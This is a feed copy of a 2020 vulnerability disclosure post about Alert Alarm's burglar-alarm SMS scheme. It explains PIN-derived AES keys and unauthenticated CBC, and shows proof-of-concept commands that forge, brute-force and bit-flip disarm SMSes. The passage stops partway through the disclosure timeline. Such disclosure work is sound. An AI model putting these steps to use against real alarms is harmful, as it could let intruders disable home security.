<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>joakimbech.com</title><link href="https://jyx.github.io/" rel="alternate"></link><link href="https://jyx.github.io/feeds/all.atom.xml" rel="self"></link><id>https://jyx.github.io/</id><updated>2020-01-05T15:01:00+01:00</updated><entry><title>Alert Alarm SMS exploit - English version</title><link href="https://jyx.github.io/alert-alarm-exploit.html" rel="alternate"></link><published>2020-01-02T12:01:00+01:00</published><updated>2020-01-05T15:01:00+01:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2020-01-02:/alert-alarm-exploit.html</id><summary type="html">&lt;p&gt;For Swedish translation of the article please go &lt;a class="reference external" href="alert-alarm-exploit-se.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="section" id="tl-dr"&gt;
&lt;h2&gt;tl;dr;&lt;/h2&gt;
&lt;p&gt;For less tech savvy people or people just bored about all the details, this
tl;dr; and the &lt;a class="reference internal" href="#summary"&gt;summary&lt;/a&gt; section at the end should be enough to read to get an
understanding of the issues.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;As of today, 2020-01-01, the issues presented here still haven't been fixed
even though initial report date was July 3rd 2019.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://www.alertalarm.se"&gt;Alert Alarm&lt;/a&gt; is a Swedish company selling burglar alarms (with various
possibilities for â€¦&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;For Swedish translation of the article please go &lt;a class="reference external" href="alert-alarm-exploit-se.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="section" id="tl-dr"&gt;
&lt;h2&gt;tl;dr;&lt;/h2&gt;
&lt;p&gt;For less tech savvy people or people just bored about all the details, this
tl;dr; and the &lt;a class="reference internal" href="#summary"&gt;summary&lt;/a&gt; section at the end should be enough to read to get an
understanding of the issues.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;As of today, 2020-01-01, the issues presented here still haven't been fixed
even though initial report date was July 3rd 2019.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://www.alertalarm.se"&gt;Alert Alarm&lt;/a&gt; is a Swedish company selling burglar alarms (with various
possibilities for extensions) to home owners. At one of their pages [&lt;a class="reference external" href="https://www.alertalarm.se/hemlarm/garanti-och-funktion.html#1"&gt;1&lt;/a&gt;],
they are saying that: &amp;quot;Our burglar alarms for home owners communicate using
an encrypted channel primarily using GSM and secondarily using SMS&amp;quot;.
Apparently there is also some collaboration with &lt;a class="reference external" href="https://www.verisure.se/"&gt;Verisure&lt;/a&gt; since the people
that I've been in contact with after reporting the issue to Alert Alarm are
coming from Verisure.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;strong&gt;Added 2020-01-03&lt;/strong&gt;: An update and clarification regarding Verisure's role
in this, since some people have misunderstood and misinterpreted some of the
information in this article. Also, people working at Verisure have told me
that the two burglar alarms solutions, i.e., Alert Alarms and Verisure's
solution have nothing in common. Note however that these statements are
&lt;strong&gt;not&lt;/strong&gt; coming directly from Verisure, but instead for people who claim that
their working for Verisure.&lt;/p&gt;
&lt;p&gt;So, what have this to do with Verisure otherwise? To start with Alert Alarm
is a subsidiary to Verisure (see &lt;a class="reference external" href="https://www.merinfo.se/foretag/Alert-Alarm-AB-5566748975/2k2aqzz-hp1t/styrelse-koncern"&gt;merinfo.se&lt;/a&gt;). After my report last summer
I've &lt;strong&gt;only&lt;/strong&gt; been in contact with Verisure people (people where their email
address ends with &amp;#64;verisure.com). If it is Verisure employees or Alert Alarm
employees that have been working with mitigations I cannot tell, likewise I
cannot say anything about the differences and similarities between their
different solutions. But what I definitely know is that I've only been in
contact with people from Verisure.&lt;/p&gt;
&lt;p&gt;But, to repeat and clarify, &lt;strong&gt;this report is only about Alert Alarms burglar
alarm and have nothing to do with Verisures burglar alarm&lt;/strong&gt;. If (and when)
Alert Alarm and/or Verisure want to add information, confirm or make other
clarifications I'm going to update this article accordingly. My goal is to
give facts and not distort or give wrong and misleading information. In
other words, please reach out to my if you find information in this article
not accurate so I can fix it by using your references and comments. Note
however that neither Alert Alarm nor Verisure to this date have denied that
the information in this report is wrong and what can be read here is more or
less the same as sent to them in July last year.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;It all started out one morning in June 2019 when I noticed that when turning
of the alarm from the App, a SMS was generated where the content was a long
(hex-)string with random characters. After doing some reverse engineering I
found out that Alert Alarm have multiple weaknesses in their SMS
implementation that are used when turning on/off alarms from their Alert Alarm
app (tested on Android). The weaknesses can be summarised in:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Crypto algorithm in use is plain AES-CBC which is &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Malleability_(cryptography)"&gt;malleable&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;No integrity protection of the encrypted messages.&lt;/li&gt;
&lt;li&gt;Heavily reduced key space, from 128-bits to 9999 keys.&lt;/li&gt;
&lt;li&gt;Doesn't use any device unique values/properties in the data being sent to
the Alert Alarm server.&lt;/li&gt;
&lt;li&gt;No key derivation function in use (KDF).&lt;/li&gt;
&lt;li&gt;No key exchange protocol in use (like Diffie Hellman for example).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;This makes the security of the implementation very fragile, since all it
takes for a rouge user is to get hold of a &lt;strong&gt;single&lt;/strong&gt; SMS generated by the
Alert Alarm app to be able to gain access to someones house. I.e., when the
attacker got that he can easily figure out the code used to turn on/off the
burglar alarm. Using free services one can send &lt;a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;amp;oq=send+spoofed+sms"&gt;spoofed SMS&lt;/a&gt; with manually
crafted data and then it's just to enter the victims house and no alarm will
go off. Alternatively a thief can break into the house and just simply enter
the code to turn off the alarm as the homeowner would do.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;On this page, one can find examples and a script that can decrypt Alert Alarm
SMSes and also create valid Alert Alarm SMSes. The script is also capable of
finding a key using a brute force attack and it's also possible to flip bits
to change the original intention of the SMS.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="observation"&gt;
&lt;h2&gt;Observation&lt;/h2&gt;
&lt;p&gt;As mentioned, this caught my attention when I noticed that when turning off an
active alarm (&lt;tt class="docutils literal"&gt;ARMED_HOME&lt;/tt&gt;) using the Android app, a SMS is created similar to
this (had to blur parts of it, otherwise anyone could figure out my own code by
just running the scripts presented here).&lt;/p&gt;
&lt;div class="align-center figure"&gt;
&lt;img alt="SMS image" src="/images/alert/aa_initial_sms.png" /&gt;
&lt;/div&gt;
&lt;p&gt;After spending the rest of the morning reverse engineering the app I could see
that the 64 bytes hex string is made up of two parts. The first part is the IV,
which is a random number (coming from &lt;tt class="docutils literal"&gt;SHA1PRNG&lt;/tt&gt;) and the second part is the
actual message.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;   32 bytes   32 bytes
+-----------+----------+
| IV        | Message  |
+-----------+----------+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It uses a 128-bit key, however the key used for encryption are made up of
strings like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;000000000000xxxx
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Where &amp;quot;xxxx&amp;quot; is the pin code that is used to turn on and off the burglar alarm.
This means the key space is heavily reduced from 128-bits, to only 9999
combinations instead of 340282366920938463463374607431768211455 combinations as
it would have been if they had used a proper key!&lt;/p&gt;
&lt;p&gt;The message it self is encrypted using plain &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_(CBC)"&gt;AES-CBC&lt;/a&gt;, so no integrity
protection or anything. What that means is that although the SMS is encrypted
anyone can still modify it without the receiver noticing that. I'll talk more
about that further down in the examples about flipping bits (see the section:
&amp;quot;Flip a bit in the encrypted message&amp;quot;).&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="message-format"&gt;
&lt;h3&gt;Message format&lt;/h3&gt;
&lt;p&gt;The format of the decrypted message is as follows:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Bytes:            1   1   1      2       1     2        2        2         2          2   = 16 bytes
        +-----------+---+---+------+---------+-----+------+--------+---------+----------+
        |SMS Version| i | j | year | month-1 | day | hour | minute | user id | \x00\x00 |
        +-----------+---+---+------+---------+-----+------+--------+---------+----------+
                                      (hex)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here &amp;quot;&lt;tt class="docutils literal"&gt;i&lt;/tt&gt;&amp;quot; seems to represent the &amp;quot;&lt;cite&gt;alarm off (0)&lt;/cite&gt;&amp;quot; and &amp;quot;&lt;cite&gt;alarm on (1)&lt;/cite&gt;&amp;quot; and
&amp;quot;&lt;tt class="docutils literal"&gt;j&lt;/tt&gt;&amp;quot; is probably whether it is &amp;quot;&lt;cite&gt;armed home&lt;/cite&gt;&amp;quot; or &amp;quot;&lt;cite&gt;armed away&lt;/cite&gt;&amp;quot;.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="script"&gt;
&lt;h2&gt;Script&lt;/h2&gt;
&lt;p&gt;On my GitHub page, you'll find a Python script (&lt;a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py"&gt;aaxploit.py&lt;/a&gt;) that I wrote as
a proof of concept script. With that script you can generate valid Alert Alarm
SMSes, brute force SMS to get the code to the burglar alarm and a couple of other
things that I'll go more into detail separately below. Calling the script with
no arguments lists all possible parameters. But to make it easier to follow
along, we've put together a couple of examples below.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="generate-a-sms-from-scratch"&gt;
&lt;h3&gt;Generate a SMS from scratch&lt;/h3&gt;
&lt;p&gt;This creates a valid SMS message (hex string), i.e, a real usable string that
can be sent as an SMS and that will either turn on or turn off the alarm. &amp;quot;-p&amp;quot;
here is the code that you want to use. If you own an Alert Alarm system, then
you can try this, put your own and known code after &amp;quot;-p&amp;quot; and use either &amp;quot;--on&amp;quot;
or &amp;quot;--off&amp;quot; to arm or disarm the alarm. Then take the crafted SMS and send it as
an SMS to the alarm unit to attack.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Added 2020-01-05&lt;/strong&gt;: After getting feedback from other Alert Alert users, we
can conclude that there is no central SMS number, instead it seems like it's
main unit itself that receives the SMS directly.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py -e -p &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              &lt;span class="m"&gt;32303131393630333038343830310000&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d244e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              &lt;span class="m"&gt;30303030303030303030303031323334&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000001234&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: encryption
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Crafted SMS:      d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="decrypt-a-sms-from-the-phone"&gt;
&lt;span id="decrypt-sms"&gt;&lt;/span&gt;&lt;h3&gt;Decrypt a SMS from the phone&lt;/h3&gt;
&lt;p&gt;As an example, take the crafted SMS from the example above (having that said,
copy a SMS string from a phone, generated by the Alert Alarm app works just as
well). In this example we already know the pin code to turn on/off the alarm,
so we provide that as a parameter.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d244e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              &lt;span class="m"&gt;30303030303030303030303031323334&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000001234&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: decryption
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: &lt;span class="p"&gt;|&lt;/span&gt; sms_v &lt;span class="p"&gt;|&lt;/span&gt; i &lt;span class="p"&gt;|&lt;/span&gt; j &lt;span class="p"&gt;|&lt;/span&gt; year &lt;span class="p"&gt;|&lt;/span&gt; month &lt;span class="p"&gt;|&lt;/span&gt; day &lt;span class="p"&gt;|&lt;/span&gt; hour &lt;span class="p"&gt;|&lt;/span&gt; minute &lt;span class="p"&gt;|&lt;/span&gt; user_id &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;:       &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="m"&gt;19&lt;/span&gt;     0x6    &lt;span class="m"&gt;03&lt;/span&gt;     &lt;span class="m"&gt;08&lt;/span&gt;       &lt;span class="m"&gt;48&lt;/span&gt;        &lt;span class="m"&gt;01&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="brute-force-an-encrypted-sms"&gt;
&lt;h3&gt;Brute force an encrypted SMS&lt;/h3&gt;
&lt;p&gt;Here we pretend that we &lt;strong&gt;don't&lt;/strong&gt; know the key (i.e., the pin code to turn
on/off the alarm), but we somehow have gotten hold of the encrypted SMS. By
running the brute force attack we try to find the correct key and pin to turn
on/off the alarm. Due to the nature of how the message is encoded, this always
seems to work and since the key space is very small, it finds the key/pin in
less than a second.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d244e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              None &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000000000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: bruteforce
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: &lt;span class="o"&gt;(&lt;/span&gt;Probably&lt;span class="o"&gt;)&lt;/span&gt; found the correct ...
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;:    encryption key: &lt;span class="m"&gt;30303030303030303030303031323334&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;:    pin:            &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As we can see, we found the correct key/pin code! Note that the pin code is the
same as used on the real physical burglar alarm at the alarm owners house. I.e.,
if a thief breaks in, he can enter this pin code and the alarm never goes off.&lt;/p&gt;
&lt;div class="line-block" id="flip-bits"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="flip-a-bit-in-the-encrypted-message"&gt;
&lt;h3&gt;Flip a bit in the encrypted message&lt;/h3&gt;
&lt;p&gt;Since AES-CBC is &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Malleability_(cryptography)"&gt;malleable&lt;/a&gt;, we can flip a bit in the IV which will be directly
reflected on the decrypted message. I.e., a man in the middle can use this to
either change a message from &amp;quot;Turn on alarm&amp;quot; to a &amp;quot;Turn off alarm&amp;quot; or vice
versa. Notice that here one doesn't even have to decrypt the message, i.e, by
just taking the original message and flip a bit and use the modified SMS is
enough to turn off (or turn on) the alarm. In the example below we flip the
meaning of the &amp;quot;&lt;tt class="docutils literal"&gt;i&lt;/tt&gt;&amp;quot; bit.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b --flip &lt;span class="m"&gt;112&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d244e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              None &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000000000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: flip bits
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Modified IV:      d245e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Modified SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If we take the &amp;quot;Modified SMS&amp;quot; and decrypt it, we can see that the &amp;quot;i&amp;quot; field has
been changed (from &amp;quot;0&amp;quot; to &amp;quot;1&amp;quot;, compare with message above, see the section
&amp;quot;Decrypt a SMS from the phone&amp;quot;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py --input d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Original SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d245e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              &lt;span class="m"&gt;30303030303030303030303031323334&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000001234&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: decryption
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: &lt;span class="p"&gt;|&lt;/span&gt; sms_v &lt;span class="p"&gt;|&lt;/span&gt; i &lt;span class="p"&gt;|&lt;/span&gt; j &lt;span class="p"&gt;|&lt;/span&gt; year &lt;span class="p"&gt;|&lt;/span&gt; month &lt;span class="p"&gt;|&lt;/span&gt; day &lt;span class="p"&gt;|&lt;/span&gt; hour &lt;span class="p"&gt;|&lt;/span&gt; minute &lt;span class="p"&gt;|&lt;/span&gt; user_id &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;:       &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="m"&gt;19&lt;/span&gt;     0x6    &lt;span class="m"&gt;03&lt;/span&gt;     &lt;span class="m"&gt;08&lt;/span&gt;       &lt;span class="m"&gt;48&lt;/span&gt;        &lt;span class="m"&gt;01&lt;/span&gt;
                  /&lt;span class="se"&gt;\&lt;/span&gt;
                  &lt;span class="p"&gt;|&lt;/span&gt;----- changed from &lt;span class="m"&gt;0&lt;/span&gt; to &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that bit-flipping can be done to anything in the data, i.e., it would
probably work to trick the system by taking an old valid SMS created by the
Alert Alarm app and then just flip the date and/or hour bits and resend the
modified SMS.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="other-attacks"&gt;
&lt;h2&gt;Other attacks?&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Is the Alert Alarm solution susceptible to &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Replay_attack"&gt;replay attacks&lt;/a&gt;? Is is possible
to send the same message more than once?&lt;ul&gt;
&lt;li&gt;No it's not, sending the same SMS twice makes the main control unit say
&amp;quot;FjÃ¤rrkontroll, felkod 2&amp;quot;. Also by adding for example +1 to minute still
doesn't work. So, probably Alert Alarm on the server side are checking
either a hash of all messages coming in and/or simply just check that the
data in the SMS isn't too old.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Will the Alert Alarm server detect brute force attacks. I.e., can one send
9999 SMS in a short amount of time and thereby gain access to someones house?&lt;ul&gt;
&lt;li&gt;I haven't got this confirmed, but it's certainly something one easily could
try.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Added 2020-01-05&lt;/strong&gt;: Since other Alert Alarm users have helped confirming
that it's not a single number for SMSes going to a common server, this
attack in practice becomes infeasible, since it'd require too many SMSes to
be able to practically make an attack. However, don't mix up this brute
force attack with the brute force attack on the SMS (two different attacks).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="open-questions"&gt;
&lt;h2&gt;Open questions&lt;/h2&gt;
&lt;p&gt;Why did Alert Alarm decide to use SMS from the app, when there already must be a
data connection with the app? This means that it probably works something like
this.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;The SMS is sent to the server.&lt;/li&gt;
&lt;li&gt;The server decrypts the SMS, checks the parameters, record the action
and send out a request (using the data connection over GSM) to the home
owners main unit controlling the alarm.&lt;/li&gt;
&lt;li&gt;When the alarm has been armed/disarmed, the Android app gets a
notification of the updated status.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Added 2020-01-05&lt;/strong&gt;: Since other Alert Alarm users have helped confirming
that there is no single SMS service, the reasoning above cannot be correct.
It's probably instead SMS -&amp;gt; Main unit -&amp;gt; Change status -&amp;gt; Inform Alert Alarm
server -&amp;gt; Notification in the app. But, it's impossible to tell whether this
is how it really works, I can just speculate on my own, Alert Alarm would need
to confirm.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Why on earth use SMS at all? Doesn't all mobile phone / users have a data
connection in 2019?&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="questions-and-statements-on-forums-etc"&gt;
&lt;h2&gt;Questions and statements on forums etc&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Added 2020-01-05&lt;/strong&gt;: After going public with this people have started asking
questions directly to me and in forums etc, I will try to give my view and
answers to some of it here.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Q: SMS is actually a feature, since there are areas without data coverage.&lt;ul&gt;
&lt;li&gt;A: I agree on that part. Living in a country where data coverage is very
good I maybe was too quick on that. However, if the company offer such a
service/feature then they must carefully architect the solution in a way
that it is secure and that man in the middle cannot make any sense out of
the data that is sent between the app and the one receiving the SMS.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q: Will the one making a brute force SMS attack get any notification when the
correct number has been found?&lt;ul&gt;
&lt;li&gt;A: No, it's just a regular SMS sent out, so in an attack one would send all
messages needed to cover the entire key space (9999 keys). However as stated
in other places in this article after the 2020-01-05 update, this brute
force attack will be practically infeasible since you'd need to brute force
the SMS phone number also.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q: A burglar alarm isn't at the end of the day that useful, at best it'll
put some stress on the thieves and maybe the thieves goes to the neighbors
with no burglar alarm instead of trying to get into your house.&lt;ul&gt;
&lt;li&gt;A: I think I mostly agree on that. If police and/or a guard would have shown
up within minutes after the alarm goes of, then it'd be really useful. But I
think most people with me knows that it can take quite a bit of time until
someone actually shows up. However today alarms have many other features
that can be useful to home owners, fire alarm, leaking water etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;!-- summary_: --&gt;
&lt;/div&gt;
&lt;div class="section" id="contact-with-alert-alarm-verisure"&gt;
&lt;h2&gt;Contact with Alert Alarm / Verisure&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;July 3rd 2019&lt;/strong&gt;: I'm reporting to the support page that I want to disclose a
security issue.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;July 9th 2019&lt;/strong&gt;: Using a private Facebook message to Alert Alarm I once
again try to say that I have a security issue that I want to report.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;July 10th 2019&lt;/strong&gt;:&lt;ul&gt;
&lt;li&gt;Alert Alarm responds at Facebook that they've sent my contact details to the
people developing the app.&lt;/li&gt;
&lt;li&gt;Verisure's Information Security Manager try to contact me using first phone
and then email.&lt;/li&gt;
&lt;li&gt;I send over the report (basically this blog post) together with proof of
concept scripts.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Augusti 12th 2019&lt;/strong&gt;: Phone meeting with Verisure, I get a status update and
Verisure mentions that they need more time than standard 90-day disclosure
time, something that I'm fine with.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;October 2nd 2019&lt;/strong&gt;: I reach out to Verisure asking for an update. Message is that
they are still working on a solution, testing &amp;quot;something&amp;quot; that should work and
that they soon will let me know more about it. I also ask about CVE number and
when we can go public with this. No answer to that.&lt;/li&gt;
